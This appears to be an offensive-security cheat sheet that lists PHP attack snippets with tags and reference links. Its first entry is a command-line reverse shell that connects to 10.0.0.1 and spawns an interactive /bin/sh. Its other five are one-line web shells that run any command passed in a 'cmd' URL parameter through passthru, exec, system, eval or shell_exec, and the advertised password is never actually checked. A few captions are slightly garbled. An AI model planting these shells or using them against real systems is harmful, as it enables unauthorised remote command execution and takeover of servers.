### 1. php reverse shell : php from the CLI
```
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```
**- linux,reverse shells,Windows,php**
#### References:

https://highon.coffee/blog/reverse-shell-cheat-sheet/
__________
### 2. Php Simple shell, set aPasswordto access, cmd is your command: See Commix to use this easily
```
<?php if (isset($_GET['Password'])){passthru($_GET['cmd']);} ?>
```
**- web application,php,remote command shell**
#### References:

php.net/manual/en/function.passthru.php
__________
### 3. Php Simple shell, set Password to access, cmd is your command: See Commix to use this easily
```
<?php if (isset($_GET['Password'])){exec($_GET['cmd']);} ?>
```
**- web application,php,remote command shell**
#### References:

php.net/manual/en/function.exec.php
__________
### 4. Php Simple shell, set Password to access, cmd is your command: See Commix to use this easily
```
<?php if (isset($_GET['Password'])){system($_GET['cmd']);} ?>
```
**- web application,php,remote command shell**
#### References:

php.net/manual/en/function.system.php
__________
### 5. Php Simple shell, set Password to access, cmd is your command: See Commix to use this easily
```
<?php if (isset($_GET['Password'])){eval($_GET['cmd']);} ?>
```
**- web application,php,remote command shell**
#### References:

php.net/manual/en/function.eval.php
__________
### 6. Php Simple shell, set Password to access, bis your command: See Commix to use this easily
```
<?php if (isset($_GET['Password'])){shell_exec($_GET['cmd']);} ?>
```
**- web application,php,remote command shell**
#### References:

php.net/manual/en/function.shell-exec.php
__________
